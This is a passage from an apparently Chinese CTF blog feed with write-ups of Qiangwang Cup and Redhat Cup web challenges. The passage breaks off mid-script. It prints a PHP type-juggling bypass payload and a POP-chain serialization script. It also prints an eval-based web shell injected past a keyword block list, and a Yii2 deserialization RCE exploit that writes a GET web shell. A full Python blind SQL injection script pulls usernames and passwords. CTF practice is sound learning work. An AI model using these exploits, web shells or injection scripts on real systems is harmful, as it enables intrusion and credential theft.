class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number5&#x27;</span>]);<br>var_dump(<span class="hljs-variable">$ppp</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>var_dump(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num1</span>) &amp;&amp; is_numeric(<span class="hljs-variable">$num1</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;非数字&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">else</span>&#123;<br>  <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num1</span> &gt; <span class="hljs-number">1024</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;第一层&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num2</span>) &amp;&amp; strlen(<span class="hljs-variable">$num2</span>) &lt;= <span class="hljs-number">4</span> &amp;&amp; intval(<span class="hljs-variable">$num2</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">500000</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;第二层&quot;</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num3</span>) &amp;&amp; <span class="hljs-string">&#x27;4bf21cd&#x27;</span> === substr(md5(<span class="hljs-variable">$num3</span>),<span class="hljs-number">0</span>,<span class="hljs-number">7</span>))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;第三层&quot;</span>;<br>                <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$num4</span> &lt; <span class="hljs-number">0</span>)&amp;&amp;(<span class="hljs-variable">$num4</span> == <span class="hljs-number">0</span>)&amp;&amp;(<span class="hljs-variable">$num4</span> &lt;= <span class="hljs-number">0</span>)&amp;&amp;(strlen(<span class="hljs-variable">$num4</span>) &gt; <span class="hljs-number">6</span>)&amp;&amp;(strlen(<span class="hljs-variable">$num4</span>) &lt; <span class="hljs-number">8</span>)&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num4</span>) )&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;第四层&quot;</span>;<br>                    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num5</span>)||(strlen(<span class="hljs-variable">$num5</span>)==<span class="hljs-number">0</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>                    <span class="hljs-variable">$b</span>=json_decode(@<span class="hljs-variable">$num5</span>);<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$y</span> = <span class="hljs-variable">$b</span> === <span class="hljs-literal">NULL</span>)&#123;<br>                                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$y</span> === <span class="hljs-literal">true</span>)&#123;<br>                                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;第五层&quot;</span>;<br>                                    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;KeY1lhv.php&#x27;</span>;<br>                                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$KEY1</span>;<br>                                &#125;<br>                        &#125;<span class="hljs-keyword">else</span>&#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>                        &#125;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no111&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="传参方式"><a href="#传参方式" class="headerlink" title="传参方式"></a>传参方式</h4><p>有个extract($_POST);它把数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p><h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>第一层<code>弱类型</code>，第二层<code>科学计数法</code>,第三层<code>脚本</code>，第四层<code>科学计数法</code>,第五层<code>json_decode()</code>.接受一个 JSON 编码的字符串并且把它转换为 PHP 变量</p><p>通过恰当的 PHP 类型返回在 <code>json</code> 中编码的数据。值<code>true</code>, <code>false</code> 和 <code>null</code> 会相应地返回 <strong><code>true</code></strong>, <strong><code>false</code></strong> 和 <strong><code>null</code><strong>。 如果 <code>json</code> 无法被解码， 或者编码数据深度超过了递归限制的话，将会返回</strong><code>null</code></strong> 。</p><p>payload:<code>ppp[number1]=1234a&amp;ppp[number2]=9e9&amp;ppp[number3]=61823470&amp;ppp[number4]=0e99999&amp;ppp[number5]=1a</code></p><h4 id="第二部分找key就在那个里面写着，拼接一下即可"><a href="#第二部分找key就在那个里面写着，拼接一下即可" class="headerlink" title="第二部分找key就在那个里面写着，拼接一下即可"></a>第二部分找key就在那个里面写着，拼接一下即可</h4><h2 id="强⽹先锋寻宝"><a href="#强⽹先锋寻宝" class="headerlink" title="强⽹先锋寻宝"></a>强⽹先锋寻宝</h2><p>pop链比较明显</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">?php<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span><br><span class="hljs-class"></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br> <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-variable">$a</span>;<br> &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><br><span class="hljs-class"></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$b</span></span>)</span>&#123;<br> <span class="hljs-keyword">$this</span>-&gt;file[<span class="hljs-string">&#x27;filename&#x27;</span>]=<span class="hljs-variable">$b</span>;<br> &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Room</span></span><br><span class="hljs-class"></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/flag&quot;</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-keyword">$this</span>-&gt;filename=<span class="hljs-string">&quot;/flag&quot;</span>;<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-keyword">$this</span>-&gt;a=<span class="hljs-keyword">new</span> Room();<br> &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Room();<br><span class="hljs-variable">$a</span>-&gt;invoke();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> Info(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> Start(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$c</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>popmaster的脚本明天再写。休整一下。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红帽杯</title>
    <link href="/2021/07/09/2021-7-9-%E7%BA%A2%E5%B8%BD%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/07/09/2021-7-9-%E7%BA%A2%E5%B8%BD%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>题目是在ctfhub上复现的</p><h2 id="Find-it"><a href="#Find-it" class="headerlink" title="Find_it"></a>Find_it</h2><p>一看应该是文件泄露了，访问了一下robots.txt发现有提示<code>1ndexx.php</code>结合备份文件泄露</p><p>直接访问<code>/.1ndexx.php.swp</code>得到源码(关键代码如下)</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">#Really easy...</span><br><br><span class="hljs-variable">$file</span>=fopen(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable 2 open!&quot;</span>);<br><br><span class="hljs-variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> = fread(<span class="hljs-variable">$file</span>,filesize(<span class="hljs-string">&quot;flag.php&quot;</span>));<br><br><br><span class="hljs-variable">$hack</span>=fopen(<span class="hljs-string">&quot;hack.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable 2 open&quot;</span>);<br><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;</span>,<span class="hljs-variable">$a</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you die&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$a</span>)&gt;<span class="hljs-number">33</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono.&quot;</span>);<br>&#125;<br>fwrite(<span class="hljs-variable">$hack</span>,<span class="hljs-variable">$a</span>);<br>fwrite(<span class="hljs-variable">$hack</span>,<span class="hljs-variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span>);<br><br>fclose(<span class="hljs-variable">$file</span>);<br>fclose(<span class="hljs-variable">$hack</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>代码很简单，传入code过滤了一堆东西，然后写入文件。显然是要写入木马之类的。</p><p>这里有几个绕过方法，大小写绕过，构造为</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">?code=%<span class="hljs-number">3</span>C?php%<span class="hljs-number">20</span><span class="hljs-keyword">Eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);?%<span class="hljs-number">3</span>E<br></code></pre></div></td></tr></table></figure><p>蚁剑连接即可</p><p><img src="https://img-blog.csdnimg.cn/20210709125140850.png" alt="在这里插入图片描述"></p><p>另外一个思路是网上看的，用<code>show_source() 函数对文件进行语法高亮显示。</code></p><p>构造payload：<code>?code=&lt;?php show_source(__FILE__);?&gt;</code>然后访问<code>hack.php</code>,但是我在ctfhub没有做成功也不知道为啥….</p><h2 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h2><p>现成的yii2的反序列化，感觉现在看这些框架不是那么陌生了。</p><p>先分析了一下网上的复现过程，一条链是从</p><p><img src="https://img-blog.csdnimg.cn/202107101335156.png" alt="在这里插入图片描述"></p><p>跟进reset函数</p><p><img src="https://img-blog.csdnimg.cn/20210710133553865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>调用了别的地方的close函数，这里的<code>_dataReader</code>是可控的，想办法调用<code>__call</code>函数。全局搜索一下__call，最后在<code>\vendor\fzaninotto\faker\src\Faker\Generator.php</code>找到了一个合适的__call方法：</p><p><img src="https://img-blog.csdnimg.cn/20210710134209695.png" alt="在这里插入图片描述"></p><p><code>$method</code>即为<code>close</code>，参数为空，跟进format：</p><p><img src="https://img-blog.csdnimg.cn/20210710134258823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>看到<code>call_user_func_array</code>就好办了，跟进getFormatter函数，这里<code>$this-&gt;formatters</code>可控，因此<code>getFormatter</code>方法的返回值也是我们可控的，因此<code>call_user_func_array($this-&gt;getFormatter($formatter), $arguments)</code>;中，回调函数是我们可控的，但是<code>$arguments</code>为空，所以相当于我们现在能干两件事，可以调用yii2中任意的一个无参方法，或者调用原生php的类似phpinfo()这样的无参方法，但是第二种肯定不能RCE，因此还要在yii2中已有的无参方法中进行挖掘：</p><p>最后找到的<code>rest/CreateAction.php以及rest/IndexAction.php</code>都很好用。这里分析一下IndexAction.php：<br>主要是它的run方法：</p><p><img src="https://img-blog.csdnimg.cn/20210710134545205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><code>$this-&gt;checkAccess</code>和<code>$this-&gt;id</code>都是我们可控的，相当于直接函数名和参数都可控了，反序列化链至此结束。</p><p>题目给的这个题，反序列化入口很容易找到：</p><p><img src="https://img-blog.csdnimg.cn/20210710140803158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>现在整个看下来，这个链还是比较好理解的。</p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$_dataReader</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>;<br>    &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$formatters</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;close&#x27;</span>] = [<span class="hljs-keyword">new</span> IndexAction(),<span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br>    <br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;<br>    <br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span>&#123;<br>        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;checkAccess=<span class="hljs-string">&quot;phpinfo&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;id=<span class="hljs-string">&quot;1&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span>&#123;<br><br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>;<br><br>    <span class="hljs-keyword">echo</span> base64_encode(<br>        serialize(<span class="hljs-keyword">new</span> BatchQueryResult()));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>看到了禁用函数</p><p><img src="https://img-blog.csdnimg.cn/20210710205444681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>发现assert没有被禁用</p><p>改一下命令</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">$this</span>-&gt;checkAccess=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-keyword">$this</span>-&gt;id=<span class="hljs-string">&quot;file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php eval(\$_GET[&#x27;cmd&#x27;];?&gt;&#x27;)&quot;</span>;<br></code></pre></div></td></tr></table></figure><p>上传蚁剑连接，插件绕过函数禁用即可。第一次没有复现成功，后来又做了一次出了。</p><p>关于yii2一些知识有一张图挺好..</p><p><img src="https://img-blog.csdnimg.cn/20210710220138636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h2><p>进入页面F12可以看到<br><img src="https://img-blog.csdnimg.cn/20210712174230205.png" alt="在这里插入图片描述"></p><p>很明显是注入，进入<code>image.php</code>可以看到图片，试了下不同的id发现好像可以盲注，又简单试了下<br><code>if(ascii(substr(database(),1,1))&gt;1,1,0)</code>发现正常显示，ok直接脚本。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge-09493052703a08b5.sandbox.ctfhub.com:10800/image.php&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject_database</span>(<span class="hljs-params">url</span>):</span><br>name = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>low = <span class="hljs-number">32</span><br>high = <span class="hljs-number">128</span><br>mid = (low + high) // <span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> low &lt; high:<br>payload = <span class="hljs-string">&quot;if(ascii(substr(database(),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>r = requests.get(url,params = params)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>low = mid + <span class="hljs-number">1</span><br><span class="hljs-keyword">else</span>:<br>high = mid<br>mid = (low + high) // <span class="hljs-number">2</span><br><br><span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br><span class="hljs-keyword">break</span><br>name = name + <span class="hljs-built_in">chr</span>(mid)<br><span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject_table</span>(<span class="hljs-params">url</span>):</span><br>name = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>low = <span class="hljs-number">32</span><br>high = <span class="hljs-number">128</span><br>mid = (low + high) // <span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> low &lt; high:<br>payload = <span class="hljs-string">&quot;if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/=/**/&#x27;ctf&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>r = requests.get(url,params = params)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>low = mid + <span class="hljs-number">1</span><br><span class="hljs-keyword">else</span>:<br>high = mid<br>mid = (low + high) // <span class="hljs-number">2</span><br><br><span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br><span class="hljs-keyword">break</span><br>name = name + <span class="hljs-built_in">chr</span>(mid)<br><span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject_column</span>(<span class="hljs-params">url</span>):</span><br>name = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>low = <span class="hljs-number">32</span><br>high = <span class="hljs-number">128</span><br>mid = (low + high) // <span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> low &lt; high:<br>payload = <span class="hljs-string">&quot;if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/&#x27;users&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>r = requests.get(url,params = params)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>low = mid + <span class="hljs-number">1</span><br><span class="hljs-keyword">else</span>:<br>high = mid<br>mid = (low + high) // <span class="hljs-number">2</span><br><br><span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br><span class="hljs-keyword">break</span><br>name = name + <span class="hljs-built_in">chr</span>(mid)<br><span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">result</span>(<span class="hljs-params">url</span>):</span><br>name = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>low = <span class="hljs-number">32</span><br>high = <span class="hljs-number">128</span><br>mid = (low + high) // <span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> low &lt; high:<br>payload = <span class="hljs-string">&quot;if(ascii(substr((select/**/group_concat(username,password)/**/from/**/ctf.users),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>r = requests.get(url,params = params)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>low = mid + <span class="hljs-number">1</span><br><span class="hljs-keyword">else</span>:<br>high = mid<br>mid = (low + high) // <span class="hljs-number">2</span><br><br><span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br><span class="hljs-keyword">break</span><br>name = name + <span class="hljs-built_in">chr</span>(mid)<br><span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-comment"># inject_database(url)</span><br><span class="hljs-comment"># inject_table(url)</span><br><span class="hljs-comment"># inject_column(url)</span><br>result(url)<br><span class="hljs-comment"># database  : ctf</span><br><span class="hljs-comment"># table     : 